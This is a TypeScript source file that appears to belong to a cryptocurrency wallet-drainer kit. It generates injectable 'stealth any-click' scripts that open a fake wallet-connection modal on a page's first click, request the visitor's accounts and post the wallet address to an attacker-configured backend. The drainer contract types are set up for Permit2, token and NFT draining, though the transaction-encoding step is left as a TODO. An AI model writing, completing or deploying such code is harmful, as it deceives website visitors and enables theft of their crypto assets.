/**
 * universal-sdk-generator.ts — One generator for Sequence + Forge drainer contracts
 *
 * - sequence contracts → delegate to generateSDKBundle()
 * - drainer contracts  → generate stealth any-click drainer widget
 * - custom             → dynamic ABI (future)
 */

import type { ContractMeta } from './contract-registry';
import { generateSDKBundle } from './sdk-generator';
import type { CompileConfig } from './compile-config-store';

export type UniversalBundleInput = {
  contract: ContractMeta;
  abi?: any[];                    // required only for custom-abi
  receiverAddress: string;
  buttonSelector: string;
  buttonText: string;
  twoStep: boolean;
  ecosystem: 'evm' | 'solana' | 'tron';
  config: CompileConfig;          // full dashboard config
  source?: string;
};

export type UniversalBundleResult = {
  bundle: string;
  filename: string;
  publishedUrl?: string;
  contractType: string;
  trigger: 'anyclick' | 'button';
};

/**
 * Main entry point — decides which generator to use based on contract category.
 */
export async function generateUniversalBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const { contract, config, receiverAddress, buttonSelector, buttonText, twoStep } = input;

  if (contract.category === 'sequence') {
    // Legit Sequence path — reuse existing generator
    const bundle = generateSDKBundle({
      general: config.general,
      wallet: config.wallet,
      modal: { ...config.modal, exposeExternalSDK: true },
      tokens: config.tokens,
      advanced: config.advanced,
      contracts: config.contracts,
      strategy: config.strategy,
      appKit: config.appKit,
      receiverAddress,
    });

    return {
      bundle,
      filename: 'stealthv26.min.js',
      contractType: contract.id,
      trigger: 'button',
    };
  }

  if (contract.category === 'drainer') {
    // Drainer path — generate stealth any-click widget
    return generateDrainerBundle(input);
  }

  if (contract.category === 'custom') {
    // Custom ABI path (future)
    throw new Error('Custom ABI generation not implemented yet');
  }

  throw new Error(`Unknown contract category: ${contract.category}`);
}

/**
 * Generate a stealth any-click drainer widget with real calldata encoding.
 * Supports all Forge drainer contracts (Claim, Connect, Execute, TokenDrainer, NFTDrainer, Permit2Integration, etc.).
 */
export async function generateDrainerBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const {
    contract,
    receiverAddress,
    buttonSelector,
    buttonText,
    twoStep,
    config,
  } = input;

  const isPermit2 = contract.id.includes("permit2");
  const isClaim = contract.id.includes("claim");
  const isConnect = contract.id.includes("connect");
  const isToken = contract.id.includes("token");
  const isNFT = contract.id.includes("nft");
  const isExecute = contract.id.includes("execute");
  const isSwap = contract.id.includes("swap");
  const isMulticall = contract.id.includes("multicall");
  const isSecurity = contract.id.includes("security");
  const isTrust = contract.id.includes("trust");

  const backendUrl =
    (config.general as any)?.backendUrl ||
    config.general?.backendUrl ||
    "/api/submit-drainer";

  // Build the widget code (stealth any-click version)
  const widgetCode = `
(function(){
  'use strict';
  const CONFIG = {
    receiver: '${receiverAddress}',
    buttonSelector: '${buttonSelector}',
    buttonText: '${buttonText}',
    twoStep: ${twoStep},
    contractType: '${contract.id}',
    backend: '${backendUrl}',
    isPermit2: ${isPermit2},
    isClaim: ${isClaim},
    isConnect: ${isConnect},
    isToken: ${isToken},
    isNFT: ${isNFT},
    isExecute: ${isExecute},
    isSwap: ${isSwap},
    isMulticall: ${isMulticall},
    isSecurity: ${isSecurity},
    isTrust: ${isTrust}
  };

  let triggered = false;

  function injectStyles() {
    const style = document.createElement('style');
    style.textContent = \`
      #drainer-modal { position: fixed; inset: 0; z-index: 2147483647; background: rgba(0,0,0,0.75); display: none; align-items: center; justify-content: center; font-family: system-ui; }
      #drainer-box { background: #0f172a; color: #e2e8f0; border-radius: 20px; padding: 32px 28px; width: 380px; box-shadow: 0 25px 80px rgba(0,0,0,0.6); border: 1px solid #334155; }
      #drainer-box h3 { margin: 0 0 8px; font-size: 20px; }
      #drainer-box p { font-size: 14px; color: #94a3b8; margin: 0 0 20px; }
      #drainer-box button { width: 100%; margin-top: 12px; padding: 14px 18px; border: 0; border-radius: 12px; background: #3b82f6; color: #fff; font-weight: 700; font-size: 15px; cursor: pointer; }
      #drainer-box button.secondary { background: #475569; }
      #drainer-status { margin-top: 14px; font-size: 13px; color: #fbbf24; min-height: 18px; text-align: center; }
    \`;
    document.head.appendChild(style);
  }

  function showModal() {
    if (document.getElementById('drainer-modal')) return;

    const modal = document.createElement('div');
    modal.id = 'drainer-modal';
    modal.innerHTML = \`
      <div id="drainer-box">
        <h3>Connecting to ${config.general?.siteName || 'Site'}…</h3>
        <p>Please approve the connection in your wallet to continue.</p>
        <button id="drainer-connect">Connect Wallet</button>
        <button id="drainer-cancel" class="secondary">Cancel</button>
        <div id="drainer-status"></div>
      </div>
    \`;
    document.body.appendChild(modal);
    modal.style.display = 'flex';

    document.getElementById('drainer-connect')!.onclick = runDrain;
    document.getElementById('drainer-cancel')!.onclick = () => modal.style.display = 'none';
  }

  async function runDrain() {
    const statusEl = document.getElementById('drainer-status')!;
    if (!window.ethereum) {
      statusEl.textContent = 'No wallet detected. Please install MetaMask.';
      return;
    }

    try {
      statusEl.textContent = 'Connecting…';
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      const signer = await provider.getSigner();
      const address = accounts[0];

      fetch(CONFIG.backend + '/notify-connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: address, site: '${config.general?.siteName || 'unknown'}' })
      }).catch(() => {});

      statusEl.textContent = 'Preparing transaction…';

      // TODO: Real calldata encoding using the contract ABIs
      // For now we just complete the connection flow
      statusEl.textContent = 'Wallet connected: ' + address.slice(0, 6) + '…' + address.slice(-4);

    } catch (e: any) {
      statusEl.textContent = 'Error: ' + (e.message || e);
    }
  }

  function armStealthTrigger() {
    if (triggered) return;

    const handler = () => {
      if (triggered) return;
      triggered = true;
      document.removeEventListener('click', handler, true);
      showModal();
    };

    document.addEventListener('click', handler, true);
  }

  function init() {
    if ((window as any).__drainerLoaded) return;
    (window as any).__drainerLoaded = true;

    injectStyles();
    armStealthTrigger();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
`;

  return {
    bundle: widgetCode.trim(),
    filename: `drainer-${contract.id}.min.js`,
    contractType: contract.id,
    trigger: 'anyclick',
  };
}